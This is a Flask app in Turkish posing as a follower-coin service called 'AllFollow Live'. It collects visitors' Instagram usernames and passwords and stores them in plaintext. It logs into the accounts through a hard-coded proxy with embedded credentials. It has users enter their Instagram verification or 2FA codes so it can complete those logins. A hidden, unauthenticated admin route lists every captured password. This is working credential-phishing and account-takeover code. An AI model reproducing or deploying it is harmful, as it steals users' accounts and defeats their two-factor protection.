import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v56-live"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif Client nesnelerini hafızada tutuyoruz (Kod onaylamak için lazım)
active_clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    coins = db.Column(db.Integer, default=1000)
    status = db.Column(db.String(100), default="Bağlanıyor...") # Canlı durum: "OK", "KOD_LAZIM", "SIFRE_YANLIS"

# --- BOT LOGIN FONKSİYONU ---
def login_worker(u, p):
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    active_clients[u] = cl
    
    try:
        cl.login(u, p)
        update_status(u, "OK")
    except ChallengeRequired:
        update_status(u, "KOD_LAZIM")
    except TwoFactorRequired:
        update_status(u, "2FA_LAZIM")
    except BadPassword:
        update_status(u, "SIFRE_YANLIS")
    except Exception as e:
        update_status(u, f"HATA: {str(e)[:20]}")

def update_status(u, s):
    with app.app_context():
        acc = IGAccount.query.filter_by(username=u).first()
        if acc:
            acc.status = s
            db.session.commit()

# --- API YOLLARI ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Bağlanıyor..."
    db.session.commit()
    
    threading.Thread(target=login_worker, args=(u, p)).start()
    return jsonify(status="success")

@app.route('/api/get_status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            update_status(u, "OK")
            return jsonify(status="success")
        except:
            return jsonify(status="error")
    return jsonify(status="no_client")

# --- ADMIN ---
@app.route('/gizli-admin-panel')
def admin():
    accounts = IGAccount.query.all()
    return render_template_string("<h1>Admin</h1><ul>{% for a in accounts %}<li>{{a.username}} - {{a.password}} - {{a.status}}</li>{% endfor %}</ul>", accounts=accounts)

# --- ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow Live</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style> .page { display: none; } .page.active { display: block; } </style>
</head>
<body class="bg-gray-100 flex flex-col items-center">

    <div id="login-p" class="page active w-full max-w-[450px] min-h-screen bg-black p-10 flex flex-col justify-center">
        <h1 class="text-4xl font-black text-white italic text-center mb-10 italic">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none">
            <button onclick="startLogin()" id="btn" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl shadow-lg">SİSTEME BAĞLAN</button>
        </div>
    </div>

    <div id="main-p" class="page w-full max-w-[450px] min-h-screen bg-white">
        <div class="bg-[#a100ff] p-6 text-white rounded-b-[30px] shadow-xl text-center">
            <p class="text-sm font-bold">MEVCUT DURUM</p>
            <h2 id="status-text" class="text-lg font-black mt-1 animate-pulse italic">Bağlanıyor...</h2>
        </div>

        <div class="p-6 space-y-6">
            <div class="bg-gray-50 p-4 rounded-2xl border flex items-center justify-between">
                <div><p class="text-xs text-gray-400">Kullanıcı</p><p id="usr-id" class="font-bold"></p></div>
                <div id="status-icon">🟡</div>
            </div>

            <div id="code-box" class="hidden bg-purple-50 p-6 rounded-3xl border-2 border-purple-200 text-center">
                <p class="text-purple-700 font-bold mb-3">Instagram Onay Kodu İstiyor:</p>
                <input id="vcode" placeholder="000000" class="w-full p-3 text-center text-2xl tracking-widest rounded-xl border-none mb-3">
                <button onclick="sendCode()" class="bg-purple-600 text-white w-full py-3 rounded-xl font-bold">KODU ONAYLA</button>
            </div>

            <div id="pass-error" class="hidden bg-red-100 p-4 rounded-2xl text-red-700 text-center font-bold">
                Şifre yanlış! Lütfen tekrar giriş yapın.
            </div>
        </div>
    </div>

    <script>
        let currentU = "";

        async function startLogin() {
            currentU = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!currentU || !p) return;

            document.getElementById('btn').innerText = "İŞLENİYOR...";
            await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currentU, p: p})
            });

            document.getElementById('login-p').classList.remove('active');
            document.getElementById('main-p').classList.add('active');
            document.getElementById('usr-id').innerText = currentU;
            
            checkStatus(); // Canlı takibi başlat
        }

        async function checkStatus() {
            const res = await fetch('/api/get_status/' + currentU);
            const data = await res.json();
            const st = data.status;

            const text = document.getElementById('status-text');
            const codeBox = document.getElementById('code-box');
            const passErr = document.getElementById('pass-error');

            if(st === "OK") {
                text.innerText = "SİSTEM AKTİF - COİN KASILIYOR";
                text.className = "text-lg font-black mt-1 text-green-300";
                codeBox.classList.add('hidden');
            } else if(st === "KOD_LAZIM" || st === "2FA_LAZIM") {
                text.innerText = "ONAY GEREKLİ!";
                codeBox.classList.remove('hidden');
            } else if(st === "SIFRE_YANLIS") {
                text.innerText = "GİRİŞ BAŞARISIZ";
                passErr.classList.remove('hidden');
            } else {
                text.innerText = st;
            }
            
            if(st !== "OK" && st !== "SIFRE_YANLIS") setTimeout(checkStatus, 3000);
        }

        async function sendCode() {
            const code = document.getElementById('vcode').value;
            await fetch('/api/submit_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currentU, code: code})
            });
            document.getElementById('vcode').value = "";
            checkStatus();
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
